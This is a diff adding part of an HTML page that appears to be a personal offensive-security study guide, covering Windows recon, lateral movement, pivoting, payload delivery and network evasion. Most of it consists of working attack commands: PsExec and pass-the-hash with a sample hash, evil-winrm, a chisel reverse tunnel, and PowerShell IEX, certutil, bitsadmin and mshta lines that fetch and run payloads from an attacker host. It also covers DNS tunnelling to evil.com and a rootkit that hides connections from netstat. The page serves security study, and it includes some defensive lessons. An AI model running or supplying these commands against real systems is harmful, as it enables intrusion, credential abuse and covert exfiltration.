+<span class="out">OS details: Microsoft Windows 10 1809 - 2009</span>
+<br>
+<span class="comment"># scan ALL 65535 ports (slow but thorough)</span>
+<span class="prompt"></span><span class="cmd">nmap -p- 192.168.1.50</span>
+<br>
+<span class="comment"># stealth SYN scan (half-open — doesn't complete handshake)</span>
+<span class="prompt"></span><span class="cmd">nmap -sS 192.168.1.50</span>
+</div>
+
+<h3>Windows Native Recon (No Tools Required)</h3>
+
+<div class="term" data-title="target — built-in commands">
+<span class="comment"># network interfaces and IPs</span>
+<span class="prompt-target"></span><span class="cmd">ipconfig /all</span>
+<br>
+<span class="comment"># routing table — where traffic goes</span>
+<span class="prompt-target"></span><span class="cmd">route print</span>
+<br>
+<span class="comment"># DNS cache — recently resolved domains</span>
+<span class="prompt-target"></span><span class="cmd">ipconfig /displaydns</span>
+<br>
+<span class="comment"># active connections with PIDs</span>
+<span class="prompt-target"></span><span class="cmd">netstat -ano</span>
+<br>
+<span class="comment"># find what process owns a port</span>
+<span class="prompt-target"></span><span class="cmd">netstat -ano | findstr ":445"</span>
+<span class="out">  TCP    0.0.0.0:445    0.0.0.0:0    LISTENING    4</span>
+<span class="prompt-target"></span><span class="cmd">tasklist /fi "PID eq 4"</span>
+<span class="out">Image Name    PID  Session Name    Mem Usage</span>
+<span class="out">System          4  Services        148 K</span>
+<br>
+<span class="comment"># SMB shares on a remote host</span>
+<span class="prompt-target"></span><span class="cmd">net view \\192.168.1.50</span>
+<br>
+<span class="comment"># logged-in users on remote host</span>
+<span class="prompt-target"></span><span class="cmd">query user /server:192.168.1.50</span>
+</div>
+
+</div>
+
+<!-- ═══════════════════════════════════════════════════════════ -->
+<!-- SECTION 06: LATERAL MOVEMENT                               -->
+<!-- ═══════════════════════════════════════════════════════════ -->
+<div class="section" id="lateral">
+<h2>06 // LATERAL MOVEMENT</h2>
+
+<p>Moving from one compromised host to another inside the network. You've popped one box — now reach the domain controller, the file server, the database. Each technique has a different footprint and different requirements.</p>
+
+<h3>PsExec (SMB — Port 445)</h3>
+
+<div class="term" data-title="psexec — remote command execution">
+<span class="comment"># requires: admin creds on target, SMB (445) open</span>
+<span class="comment"># footprint: creates a service on target, visible in event logs</span>
+<span class="prompt"></span><span class="cmd">psexec.py domain/admin:Password123@192.168.1.50 cmd.exe</span>
+<span class="out">Impacket v0.11.0 - Copyright 2023 Fortra</span>
+<span class="out-green">[*] Requesting shares on 192.168.1.50.....</span>
+<span class="out-green">[*] Found writable share ADMIN$</span>
+<span class="out-green">[*] Uploading file to ADMIN$\Temp\</span>
+<span class="out-green">[*] Creating service on 192.168.1.50.....</span>
+<span class="out-green">[*] Starting service.....</span>
+<span class="out">Microsoft Windows [Version 10.0.19045]</span>
+<span class="out">C:\Windows\system32&gt;</span><span class="cmd">whoami</span>
+<span class="out">nt authority\system</span>
+</div>
+
+<h3>WinRM (Port 5985/5986)</h3>
+
+<div class="term" data-title="winrm — powershell remoting">
+<span class="comment"># requires: admin creds, WinRM enabled (port 5985 open)</span>
+<span class="comment"># footprint: cleaner than PsExec — no service creation</span>
+<span class="prompt"></span><span class="cmd">evil-winrm -i 192.168.1.50 -u admin -p 'Password123'</span>
+<span class="out-green">[+] Connected to 192.168.1.50</span>
+<span class="out-green">[+] PowerShell session established</span>
+<span class="out">*Evil-WinRM* PS C:\Users\admin\Documents&gt;</span> <span class="cmd">whoami</span>
+<span class="out">radon\admin</span>
+<br>
+<span class="comment"># native PowerShell remoting (from Windows)</span>
+<span class="prompt-target"></span><span class="cmd">Enter-PSSession -ComputerName 192.168.1.50 -Credential domain\admin</span>
+<span class="out">[192.168.1.50]: PS C:\Users\admin\Documents&gt;</span>
+</div>
+
+<h3>Pass-the-Hash (No Password Needed)</h3>
+
+<div class="term" data-title="pth — authenticate with NTLM hash">
+<span class="comment"># you dumped NTLM hashes from LSASS — don't need the plaintext password</span>
+<span class="comment"># hash format: LM:NT (LM is usually aad3b... = empty)</span>
+<span class="prompt"></span><span class="cmd">pth-winexe -U admin%aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42 //192.168.1.50 cmd.exe</span>
+<span class="out">Microsoft Windows [Version 10.0.19045]</span>
+<span class="out">C:\Windows\system32&gt;</span>
+<br>
+<span class="comment"># or with impacket</span>
+<span class="prompt"></span><span class="cmd">psexec.py -hashes :e19ccf75ee54e06b06a5907af13cef42 admin@192.168.1.50</span>
+</div>
+
+<div class="callout">
+<strong>Key insight:</strong> Windows authenticates with NTLM hashes, not passwords. If you have the hash, you ARE that user to Windows. This is why credential dumping (Mimikatz, LSASS dump) is the most impactful post-exploitation step — one set of admin hashes gives you access to every machine that admin can reach.
+</div>
+
+<h3>RDP (Port 3389)</h3>
+
+<div class="term" data-title="rdp — full desktop">
+<span class="comment"># GUI access to target — useful for browsing files, checking settings</span>
+<span class="comment"># footprint: VISIBLE — user sees the session. Use only if target is unattended.</span>
+<span class="prompt"></span><span class="cmd">xfreerdp /v:192.168.1.50 /u:admin /p:Password123 /cert-ignore</span>
+<br>
+<span class="comment"># enable RDP remotely (if you have admin on target)</span>
+<span class="prompt-target"></span><span class="cmd">reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f</span>
+<span class="prompt-target"></span><span class="cmd">netsh advfirewall firewall set rule group="remote desktop" new enable=yes</span>
+</div>
+
+</div>
+
+<!-- ═══════════════════════════════════════════════════════════ -->
+<!-- SECTION 07: PORT FORWARDING & PIVOTING                     -->
+<!-- ═══════════════════════════════════════════════════════════ -->
+<div class="section" id="pivot">
+<h2>07 // PORT FORWARDING &amp; PIVOTING</h2>
+
+<p>You've compromised a host on the DMZ. The internal network (10.10.x.x) is behind it — unreachable from your machine directly. <strong>Pivoting</strong> means routing your traffic through the compromised host to reach internal targets.</p>
+
+<div class="diagram">Your Machine              Compromised Host           Internal Target
+192.168.1.92              192.168.1.50               10.10.10.20
+                          (also on 10.10.10.1)
+    │                          │                          │
+    │   you can reach this     │   this can reach both    │  you can't reach
+    │ ════════════════════▶   │ ════════════════════▶   │  this directly
+    │                          │                          │
+    │   PIVOT: tunnel your     │                          │
+    │   traffic through the    │                          │
+    │   compromised host       │                          │
+    │ ═══════╦═════════════▶  │ ═══════════════════▶   │
+    │        ║ SSH tunnel      │                          │
+    │        ╚═════════════════╩══════════════════════▶  │
+    │   now you can reach 10.10.10.20 via the tunnel     │</div>
+
+<h3>SSH Local Port Forward</h3>
+
+<div class="term" data-title="ssh — local forward">
+<span class="comment"># forward local port 8888 → internal target 10.10.10.20:80 via compromised host</span>
+<span class="prompt"></span><span class="cmd">ssh -L 8888:10.10.10.20:80 user@192.168.1.50</span>
+<br>
+<span class="comment"># now browse http://localhost:8888 — traffic routes through 192.168.1.50</span>
+<span class="prompt"></span><span class="cmd">curl http://localhost:8888</span>
+<span class="out-green">&lt;html&gt;Internal Web App&lt;/html&gt;</span>
+</div>
+
+<h3>SSH Dynamic Port Forward (SOCKS Proxy)</h3>
+
+<div class="term" data-title="ssh — socks proxy">
+<span class="comment"># create SOCKS proxy on local port 1080 via compromised host</span>
+<span class="prompt"></span><span class="cmd">ssh -D 1080 user@192.168.1.50</span>
+<br>
+<span class="comment"># route ANY tool through the proxy with proxychains</span>
+<span class="prompt"></span><span class="cmd">proxychains nmap -sT 10.10.10.0/24</span>
+<span class="prompt"></span><span class="cmd">proxychains curl http://10.10.10.20</span>
+<span class="prompt"></span><span class="cmd">proxychains evil-winrm -i 10.10.10.20 -u admin -p pass</span>
+</div>
+
+<h3>Chisel (No SSH Required)</h3>
+
+<div class="term" data-title="chisel — http tunnel">
+<span class="comment"># on your machine — start chisel server</span>
+<span class="prompt"></span><span class="cmd">./chisel server --reverse --port 8000</span>
+<span class="out">server: Listening on http://0.0.0.0:8000</span>
+<br>
+<span class="comment"># on compromised host — connect back and create reverse SOCKS</span>
+<span class="prompt-target"></span><span class="cmd">.\chisel.exe client 192.168.1.92:8000 R:socks</span>
+<span class="out-green">client: Connected</span>
+<br>
+<span class="comment"># now use proxychains on your machine to reach internal network</span>
+<span class="prompt"></span><span class="cmd">proxychains nmap 10.10.10.0/24</span>
+</div>
+
+<div class="callout-green callout">
+<strong>Why chisel over SSH:</strong> Targets don't always have SSH. Chisel is a single static binary — upload it, run it, tunnel established. HTTP-based, so it traverses proxies and firewalls that block SSH. Reverse mode means the target connects out to you (like a reverse shell but for tunnels).
+</div>
+
+</div>
+
+<!-- ═══════════════════════════════════════════════════════════ -->
+<!-- SECTION 08: PAYLOAD DELIVERY METHODS                       -->
+<!-- ═══════════════════════════════════════════════════════════ -->
+<div class="section" id="delivery">
+<h2>08 // PAYLOAD DELIVERY METHODS</h2>
+
+<p>Getting your payload onto the target. Each method has different OPSEC tradeoffs — disk footprint, network signature, and detection risk.</p>
+
+<h3>Staged vs Stageless</h3>
+
+<div class="term" data-title="delivery comparison">
+<span class="out-amber">STAGED (two-step)</span>
+<span class="out">  Step 1: Small stager (2-5KB) downloads the real payload</span>
+<span class="out">  Step 2: Payload executes in memory — never touches disk</span>
+<span class="out">  Pro: tiny initial footprint, payload can be large</span>
+<span class="out">  Con: requires network callback to fetch stage 2</span>
+<br>
+<span class="out-green">STAGELESS (one-shot)</span>
+<span class="out">  Everything in one binary — executes immediately</span>
+<span class="out">  Pro: no network dependency after initial delivery</span>
+<span class="out">  Con: larger binary, more signatures for AV to scan</span>
+<br>
+<span class="out-cyan">VADER uses STAGED:</span>
+<span class="out">  vader_stager.exe (stage 1) → HTTP GET → payload.dll (stage 2)</span>
+<span class="out">  vader_inject.exe loads payload.dll into target process memory</span>
+<span class="out">  payload.dll never written to disk = harder for forensics</span>
+</div>
+
+<h3>HTTP Staging (python -m http.server)</h3>
+
+<div class="term" data-title="http staging — practical">
+<span class="comment"># attacker: serve payload directory</span>
+<span class="prompt"></span><span class="cmd">python3 -m http.server 9090 --directory /opt/payloads/</span>
+<br>
+<span class="comment"># target: download + execute in memory (PowerShell)</span>
+<span class="prompt-target"></span><span class="cmd">IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.92:9090/runner.ps1')</span>
+<br>
+<span class="comment"># target: download to disk + run</span>
+<span class="prompt-target"></span><span class="cmd">Invoke-WebRequest http://192.168.1.92:9090/payload.exe -OutFile C:\temp\svc.exe</span>
+<span class="prompt-target"></span><span class="cmd">Start-Process C:\temp\svc.exe</span>
+<br>
+<span class="comment"># target: certutil — often less monitored than PowerShell</span>
+<span class="prompt-target"></span><span class="cmd">certutil -urlcache -split -f http://192.168.1.92:9090/payload.exe C:\temp\svc.exe</span>
+<br>
+<span class="comment"># target: bitsadmin — background download</span>
+<span class="prompt-target"></span><span class="cmd">bitsadmin /transfer job /download /priority high http://192.168.1.92:9090/payload.exe C:\temp\svc.exe</span>
+</div>
+
+<h3>SMB Staging (Port 445)</h3>
+
+<div class="term" data-title="smb staging — no http needed">
+<span class="comment"># attacker: create SMB share (impacket)</span>
+<span class="prompt"></span><span class="cmd">smbserver.py SHARE /opt/payloads/ -smb2support</span>
+<span class="out">Impacket v0.11.0</span>
+<span class="out-green">[*] Config file parsed</span>
+<span class="out-green">[*] Callback added for UUID ...</span>
+<br>
+<span class="comment"># target: execute directly from share (no disk write!)</span>
+<span class="prompt-target"></span><span class="cmd">\\192.168.1.92\SHARE\payload.exe</span>
+<br>
+<span class="comment"># or copy first</span>
+<span class="prompt-target"></span><span class="cmd">copy \\192.168.1.92\SHARE\payload.exe C:\temp\svc.exe</span>
+</div>
+
+<h3>Living off the Land (LOLBins)</h3>
+
+<div class="term" data-title="lolbins — trusted binaries as download tools">
+<span class="comment"># certutil — Microsoft certificate utility, doubles as downloader</span>
+<span class="prompt-target"></span><span class="cmd">certutil -urlcache -split -f http://192.168.1.92/p.exe p.exe</span>
+<br>
+<span class="comment"># mshta — HTML Application host, executes remote HTA</span>
+<span class="prompt-target"></span><span class="cmd">mshta http://192.168.1.92/payload.hta</span>
+<br>
+<span class="comment"># rundll32 — load DLL from SMB share</span>
+<span class="prompt-target"></span><span class="cmd">rundll32 \\192.168.1.92\share\payload.dll,EntryPoint</span>
+<br>
+<span class="comment"># bitsadmin — Background Intelligent Transfer Service</span>
+<span class="prompt-target"></span><span class="cmd">bitsadmin /transfer x /download http://192.168.1.92/p.exe %temp%\p.exe</span>
+</div>
+
+<div class="callout">
+<strong>Why LOLBins matter:</strong> These are signed Microsoft binaries — Defender doesn't block <code>certutil.exe</code> itself. Application whitelisting (AppLocker) allows them by default. You're using the OS against itself. Detection relies on behavioral monitoring: "why is certutil downloading an exe?"
+</div>
+
+</div>
+
+<!-- ═══════════════════════════════════════════════════════════ -->
+<!-- SECTION 09: NETWORK EVASION                                -->
+<!-- ═══════════════════════════════════════════════════════════ -->
+<div class="section" id="evasion">
+<h2>09 // NETWORK EVASION</h2>
+
+<p>Your C2 traffic needs to look like normal traffic. Firewalls, IDS/IPS, and SOC analysts are watching. Every technique here addresses a specific detection mechanism.</p>
+
+<h3>Encrypted Channels (HTTPS C2)</h3>
+
+<div class="term" data-title="encryption defeats content inspection">
+<span class="out-red">WITHOUT encryption:</span>
+<span class="out">  GET /commands HTTP/1.1</span>
+<span class="out">  Response: {"task":"mimikatz","args":"sekurlsa::logonpasswords"}</span>
+<span class="out">  → IDS signature matches "mimikatz" → ALERT</span>
+<br>
+<span class="out-green">WITH HTTPS:</span>
+<span class="out">  TLS handshake → encrypted tunnel</span>
+<span class="out">  Proxy sees: destination IP + SNI hostname — NOT the content</span>
+<span class="out">  → No payload inspection possible without SSL interception</span>
+</div>
+
+<h3>Domain Fronting</h3>
+
+<div class="term" data-title="hiding C2 behind CDN">
+<span class="comment"># traffic appears to go to legitimate CDN domain</span>
+<span class="out">TLS SNI: cdn.microsoft.com  ← what the firewall sees</span>
+<span class="out">HTTP Host: evil-c2.azureedge.net  ← where CDN actually routes it</span>
+<br>
+<span class="out">Firewall sees traffic to Microsoft's CDN — looks completely legitimate.</span>
+<span class="out">CDN routes based on Host header to attacker's C2 server.</span>
+<br>
+<span class="out-amber">Status: most cloud providers (AWS, Azure, GCP) have blocked this.</span>
+<span class="out-amber">Still works on some smaller CDNs and custom configurations.</span>
+</div>
+
+<h3>DNS Tunneling (Data Exfil)</h3>
+
+<div class="term" data-title="dns — data in queries">
+<span class="comment"># encode data as DNS subdomain labels</span>
+<span class="out">Query: aGVsbG8gd29ybGQ.evil.com TXT</span>
+<span class="out">         ^^^^^^^^^^^^^^^^</span>
+<span class="out">         base64("hello world") encoded as subdomain</span>
+<br>
+<span class="comment"># response carries commands back</span>
+<span class="out">TXT Record: "d2hvYW1p"  →  base64("whoami")</span>
+<br>
+<span class="comment"># tools: dnscat2, iodine, dns2tcp</span>
+<span class="prompt"></span><span class="cmd">dnscat2-server evil.com</span>
+<span class="prompt-target"></span><span class="cmd">.\dnscat2.exe evil.com</span>
+<br>
+<span class="out-amber">Speed: ~50KB/s max. Not for large transfers.</span>
+<span class="out-green">Stealth: DNS is almost never blocked. Hard to detect without</span>
+<span class="out-green">         DNS traffic analytics (query volume, label entropy).</span>
+</div>
+
+<h3>Connection Hiding (VADER Cloak)</h3>
+
+<div class="term" data-title="rootkit-level evasion">
+<span class="comment"># VADER's approach: don't evade network monitoring — blind it</span>
+<span class="out">cloak.dll hooks NtDeviceIoControlFile in every process</span>
+<span class="out">→ netstat queries return filtered results</span>
+<span class="out">→ TCP connections on hidden ports are invisible</span>
+<span class="out">→ Resource Monitor, TCPView, ProcessHacker all blinded</span>
+<br>
+<span class="out-green">BEFORE cloak:</span>
+<span class="prompt-target"></span><span class="cmd">netstat -ano | findstr "8080 4444"</span>
+<span class="out">  TCP    192.168.1.50:49832    192.168.1.92:8080   ESTABLISHED    3412</span>
+<span class="out">  TCP    192.168.1.50:49901    192.168.1.92:4444   ESTABLISHED    7720</span>
+<br>
+<span class="out-green">AFTER cloak:</span>
+<span class="prompt-target"></span><span class="cmd">netstat -ano | findstr "8080 4444"</span>
+<span class="out">[empty — connections exist but are filtered from all queries]</span>
+<br>
+<span class="out-amber">Limitation: network-level monitoring (firewall logs, packet captures)</span>
+<span class="out-amber">still sees the traffic. Cloak hides from the OS, not the wire.</span>
+</div>
+
+<div class="callout-green callout">
+<strong>Defense-in-depth lesson:</strong> This is why monitoring at multiple layers matters. Host-based tools (netstat, Task Manager) can be blinded by rootkits. Network monitoring (IDS, firewall logs, packet captures) sees traffic regardless of what the endpoint reports. Correlating both layers catches discrepancies — a connection visible on the wire but missing from netstat is a rootkit indicator.
+</div>
+
+</div>
+
+<!-- ═══════ FOOTER ═══════ -->
+<footer>
+  <p><a href="index.html">&larr; 22DIV</a> &nbsp;|&nbsp; george wu &nbsp;|&nbsp; CSEC research on own hardware</p>
+</footer>
+
+</div>
+
+<script src="site.js"></script>
+</body>
+</html>
